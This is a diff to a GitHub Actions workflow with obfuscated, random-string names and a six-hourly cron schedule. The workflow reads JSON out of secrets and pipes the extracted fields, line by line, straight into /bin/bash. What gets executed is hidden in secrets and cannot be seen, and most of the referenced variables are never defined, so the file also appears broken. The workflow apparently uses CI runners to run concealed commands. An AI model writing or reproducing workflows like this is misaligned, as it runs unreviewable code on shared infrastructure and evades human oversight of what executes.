@@ -1,9 +1,8 @@
 name: zhangguifan2189
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 1/6 * * *'
+    - cron: '57 5/6 * * *'
 
 jobs:
   build:
@@ -13,14 +12,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhangguifan2189
         env:
-          fm8488: ${{ secrets.fm8488 }}
+          hwzpb5179: ${{ secrets.hwzpb5179 }}
         run: |
-          echo $fm8488 | jq -r .zpaw9 | /bin/bash
-          echo $jk07 | jq -r .prnz411 | /bin/bash
-          echo $wdk35146 | jq -r .igli9 | /bin/bash
-          echo $gxm84 | jq -r .ek871 | /bin/bash
-          echo $s8195 | jq -r .kwllr18336 | /bin/bash
-          echo $gzfv2 | jq -r .znbrj6591 | /bin/bash
-          echo $b8258 | jq -r .ckus578 | /bin/bash
-          echo $kfmqp0 | jq -r .s34 | /bin/bash
+          echo $hwzpb5179 | jq -r .aapd269 | /bin/bash
+          echo $sqwdo77417 | jq -r .vrsjr680 | /bin/bash
+          echo $o374 | jq -r .t5378 | /bin/bash
+          echo $d0619 | jq -r .c8927 | /bin/bash
+          echo $u36119 | jq -r .uf47320 | /bin/bash
+          echo $yj4365 | jq -r .vaf4 | /bin/bash
+          echo $fo42286 | jq -r .apc2 | /bin/bash
+          echo $nrnm47 | jq -r .xokom05 | /bin/bash
+          echo $o28 | jq -r .szipf0 | /bin/bash
+          echo $aodml30104 | jq -r .ll5 | /bin/bash
 
